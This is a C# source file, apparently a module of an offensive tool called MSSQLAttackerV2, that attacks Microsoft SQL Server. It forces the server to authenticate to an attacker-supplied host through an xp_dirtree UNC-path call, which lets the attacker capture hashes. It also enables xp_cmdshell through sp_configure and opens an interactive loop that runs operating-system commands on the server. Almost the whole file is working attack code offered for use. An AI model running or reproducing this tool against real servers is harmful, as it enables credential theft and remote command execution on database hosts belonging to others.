using System;
using System.Data.SqlClient;
using System.Runtime.InteropServices;


namespace MSSQLAttackerV2.Modules
{
    internal class CommonAttacks
    {
        public void uncPathInjection(SqlConnection con, [Optional, DefaultParameterValue(null)] String lhost)
        {
            var runQuery = new RunQuery();
            var helpWrite = new Helpwrite();

            while (string.IsNullOrEmpty(lhost))
            {
                Console.Write("Enter Attacker Machine IP: ");
                lhost = Console.ReadLine();
            }
            String query = "EXEC master..xp_dirtree \"\\\\" + lhost + "\\\\anything\";";
            String request = helpWrite.getFilteredResult(runQuery.getQueryResult(con, query));
            helpWrite.doWrite(1, "Request Sent to: " + lhost);
        }
        public bool checkCmdshell(SqlConnection con)
        {
            var runQuery = new RunQuery();
            var helpWrite = new Helpwrite();
            String cmd = "select value_in_use from sys.configurations where name = 'xp_cmdshell'";
            String valueInUse = helpWrite.getFilteredResult(runQuery.getQueryResult(con, cmd));
            if (valueInUse == "1") { helpWrite.doWrite(1, "Value In Use: " + valueInUse); helpWrite.doWrite(1, "xp_cmdshell is enabled"); return true; }
            else { helpWrite.doWrite(0, "Value In Use: " + valueInUse); helpWrite.doWrite(0, "xp_cmdshell is not enabled" + valueInUse); return false; }
        }
        public void execCMD(SqlConnection con, [Optional, DefaultParameterValue(null)] String command)
        {
            var runQuery = new RunQuery();
            var helpWrite = new Helpwrite();

            if (!checkCmdshell(con)) { helpWrite.doWrite(0, "xp_cmdshell is not enabled"); return; };
            if (string.IsNullOrEmpty(command))
            {
                while (true)
                {
                    try
                    {
                        Console.Write("Enter Command: ");
                        String cmd = Console.ReadLine().ToString();
                        if (cmd == "exit") { helpWrite.doWrite(0, "Exiting!"); break; }
                        String execCmd = String.Format("EXEC xp_cmdshell '{0}'", cmd);
                        String output = helpWrite.getFilteredResult(runQuery.getQueryResult(con, execCmd));
                        helpWrite.doWrite(2, output);
                    }
                    catch (Exception)
                    {
                        helpWrite.doWrite(0, "Missing Privileges || Ex.Sysadmin");
                        return;

                    }
                }

            }
            try
            {
                String query = String.Format("EXEC xp_cmdshell '{0}'", command);
                String queryout = helpWrite.getFilteredResult(runQuery.getQueryResult(con, query));
                helpWrite.doWrite(2, queryout);
                return;

            }
            catch (Exception)
            {

                helpWrite.doWrite(0, "Missing Privileges || Ex.Sysadmin");
            }


        }
        public bool enableXpCmdShell(SqlConnection con)
        {
            var runQuery = new RunQuery();
            var helpWrite = new Helpwrite();

            try
            {
                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                String impersonatableUsers = helpWrite.getFilteredResult(runQuery.getQueryResult(con, enable_xpcmd));
                helpWrite.doWrite(1, "xp_cmdshell enabled");

                return true;
            }
            catch (Exception)
            {

                helpWrite.doWrite(0, "xp_cmdshell enable fail! || Missing Privileges");
                return false;
            }
        }
    }
    
}
